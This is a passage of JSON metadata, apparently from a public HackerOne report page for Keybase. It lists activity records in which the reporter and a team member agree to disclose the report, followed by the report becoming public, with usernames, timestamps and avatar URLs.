work.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T20:57:09.964Z","updated_at":"2019-02-08T20:57:09.964Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6847409,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T07:12:52.170Z","updated_at":"2020-01-23T07:12:52.170Z","first_to_agree":true,"actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6866267,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-24T23:20:19.981Z","updated_at":"2020-01-24T23:20:19.981Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6866268,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-24T23:20:20.095Z","updated_at":"2020-01-24T23:20:20.095Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}